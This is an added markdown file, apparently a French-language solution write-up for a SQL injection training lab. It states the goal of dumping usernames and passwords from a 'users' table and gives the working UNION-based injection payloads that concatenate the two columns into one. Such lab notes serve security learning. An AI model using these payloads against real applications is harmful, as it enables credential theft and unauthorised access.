@@ -1,0 +1,20 @@
+# SQL injection UNION attack, retrieving multiple values in a single column
+
+#Objectif :  
+
+Ce laboratoire contient une vulnérabilité d'injection SQL dans le filtre de la catégorie de produit. Les résultats de la requête sont renvoyés dans la réponse de l'application afin que vous puissiez utiliser une attaque UNION pour récupérer des données à partir d'autres tables.
+
+La base de données contient un tableau différent appelé users, avec des colonnes appelées usernameet password.
+
+Pour résoudre le laboratoire, effectuez une attaque UNION d'injection SQL qui récupère tous les noms d'utilisateur et tous les mots de passe, et utilisez les informations pour vous connecter comme administratorl'utilisateur.
+
+
+#Correction :
+
+Gifts' UNION SELECT NULL,NULL--
+
+Gifts' UNION SELECT NULL,'NULL'--
+
+Gifts' UNION SELECT NULL,username||password FROM users--
+
+
